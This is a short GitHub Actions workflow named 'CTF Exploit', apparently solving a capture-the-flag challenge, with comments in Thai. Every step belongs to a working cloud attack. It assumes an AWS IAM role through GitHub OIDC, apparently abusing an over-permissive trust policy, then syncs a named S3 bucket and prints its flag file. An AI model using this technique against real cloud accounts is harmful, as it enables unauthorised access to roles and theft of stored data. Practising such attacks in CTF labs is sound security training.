name: 'CTF Exploit'
on: [workflow_dispatch]

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      # ---!! ขั้นตอนใหม่ที่เพิ่มเข้ามา !! ---
      - name: 0. Clear local AWS credentials
        run: |
          unset AWS_ACCESS_KEY_ID
          unset AWS_SECRET_ACCESS_KEY
          unset AWS_SESSION_TOKEN
          echo "Cleared any local AWS credentials to force OIDC."

      # --- ขั้นตอนเดิม ---
      - name: 1. Assume AWS Role via OIDC
        uses: aws-actions/configure-aws-credentials@v1
        with:
          role-to-assume: 'arn:aws:iam::555239693437:role/github-oidc-oh-i-dont-care'
          role-session-name: 'CTFExploit'
          aws-region: 'ap-southeast-1'

      - name: 2. Sync Bucket and Find REAL Flag
        run: |
          echo "Syncing files from s3://oh-i-dont-care..."
          aws s3 sync s3://oh-i-dont-care .
          
          echo "--- Files downloaded ---"
          ls -la
          
          echo "--- REAL FLAG CONTENT ---"
          cat .flag || cat flag.txt || echo "REAL FLAG NOT FOUND"
